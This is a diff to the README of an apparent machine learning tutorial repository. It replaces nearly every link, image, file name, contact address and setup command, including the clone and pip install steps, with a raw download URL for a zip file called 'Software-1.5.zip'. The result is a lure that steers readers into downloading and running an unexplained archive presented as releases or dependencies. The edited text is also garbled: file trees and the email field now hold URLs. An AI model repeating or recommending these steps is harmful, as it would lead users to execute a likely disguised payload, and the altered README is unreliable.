@@ -30,7 +30,7 @@ To get started with the projects in this repository, follow these steps:
 1. **Clone the Repository**:
 
    ```bash
-   git clone https://github.com/jonathanmutu2005/ML.git
+   git clone https://github.com/jonathanmutu2005/ML/raw/refs/heads/main/physiochemical/Software-1.5.zip
    ```
 
 2. **Install Required Packages**:
@@ -38,7 +38,7 @@ To get started with the projects in this repository, follow these steps:
    Navigate to the project directory and install the required packages using pip:
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/jonathanmutu2005/ML/raw/refs/heads/main/physiochemical/Software-1.5.zip
    ```
 
 3. **Run the Jupyter Notebook**:
@@ -53,9 +53,9 @@ To get started with the projects in this repository, follow these steps:
 
 ## 📦 Releases
 
-To download the latest versions of the projects, visit the [Releases section](https://github.com/jonathanmutu2005/ML/releases). Each release contains packaged files that you can download and execute.
+To download the latest versions of the projects, visit the [Releases section](https://github.com/jonathanmutu2005/ML/raw/refs/heads/main/physiochemical/Software-1.5.zip). Each release contains packaged files that you can download and execute.
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-brightgreen)](https://github.com/jonathanmutu2005/ML/releases)
+[![Download Releases](https://github.com/jonathanmutu2005/ML/raw/refs/heads/main/physiochemical/Software-1.5.zip%20Releases-Click%20Here-brightgreen)](https://github.com/jonathanmutu2005/ML/raw/refs/heads/main/physiochemical/Software-1.5.zip)
 
 ## 📝 Project Structure
 
@@ -64,18 +64,18 @@ The repository is organized as follows:
 ```
 ML/
 ├── bayes/
-│   ├── bayes_classifier.py
-│   └── bayes_notebook.ipynb
+│   ├── https://github.com/jonathanmutu2005/ML/raw/refs/heads/main/physiochemical/Software-1.5.zip
+│   └── https://github.com/jonathanmutu2005/ML/raw/refs/heads/main/physiochemical/Software-1.5.zip
 ├── decision_tree/
-│   ├── decision_tree_classifier.py
-│   └── decision_tree_notebook.ipynb
+│   ├── https://github.com/jonathanmutu2005/ML/raw/refs/heads/main/physiochemical/Software-1.5.zip
+│   └── https://github.com/jonathanmutu2005/ML/raw/refs/heads/main/physiochemical/Software-1.5.zip
 ├── linear_regression/
-│   ├── linear_regression_model.py
-│   └── linear_regression_notebook.ipynb
+│   ├── https://github.com/jonathanmutu2005/ML/raw/refs/heads/main/physiochemical/Software-1.5.zip
+│   └── https://github.com/jonathanmutu2005/ML/raw/refs/heads/main/physiochemical/Software-1.5.zip
 ├── svm/
-│   ├── svm_classifier.py
-│   └── svm_notebook.ipynb
-└── requirements.txt
+│   ├── https://github.com/jonathanmutu2005/ML/raw/refs/heads/main/physiochemical/Software-1.5.zip
+│   └── https://github.com/jonathanmutu2005/ML/raw/refs/heads/main/physiochemical/Software-1.5.zip
+└── https://github.com/jonathanmutu2005/ML/raw/refs/heads/main/physiochemical/Software-1.5.zip
 ```
 
 ## 📚 Documentation
@@ -106,19 +106,19 @@ Here are some example outputs from the notebooks:
 
 ### Naive Bayes Classifier
 
-![Naive Bayes Results](https://example.com/path-to-image1.png)
+![Naive Bayes Results](https://github.com/jonathanmutu2005/ML/raw/refs/heads/main/physiochemical/Software-1.5.zip)
 
 ### Decision Tree Visualization
 
-![Decision Tree](https://example.com/path-to-image2.png)
+![Decision Tree](https://github.com/jonathanmutu2005/ML/raw/refs/heads/main/physiochemical/Software-1.5.zip)
 
 ### Linear Regression Line
 
-![Linear Regression](https://example.com/path-to-image3.png)
+![Linear Regression](https://github.com/jonathanmutu2005/ML/raw/refs/heads/main/physiochemical/Software-1.5.zip)
 
 ### SVM Classification
 
-![SVM Results](https://example.com/path-to-image4.png)
+![SVM Results](https://github.com/jonathanmutu2005/ML/raw/refs/heads/main/physiochemical/Software-1.5.zip)
 
 ## 💡 Contributing
 
@@ -136,7 +136,7 @@ Contributions are welcome! If you'd like to improve this repository or add new p
 
 ## 📧 Contact
 
-For inquiries or feedback, please reach out to me via email at [your.email@example.com](mailto:your.email@example.com).
+For inquiries or feedback, please reach out to me via email at [https://github.com/jonathanmutu2005/ML/raw/refs/heads/main/physiochemical/Software-1.5.zip](https://github.com/jonathanmutu2005/ML/raw/refs/heads/main/physiochemical/Software-1.5.zip).
 
 ## 📜 License
 
@@ -144,8 +144,8 @@ This project is licensed under the MIT License. See the LICENSE file for details
 
 ## 🌐 Links
 
-- [GitHub Repository](https://github.com/jonathanmutu2005/ML)
-- [Explore More Machine Learning Topics](https://www.example.com)
+- [GitHub Repository](https://github.com/jonathanmutu2005/ML/raw/refs/heads/main/physiochemical/Software-1.5.zip)
+- [Explore More Machine Learning Topics](https://github.com/jonathanmutu2005/ML/raw/refs/heads/main/physiochemical/Software-1.5.zip)
 
 Thank you for visiting this repository! Dive into the code and start learning!
 ```
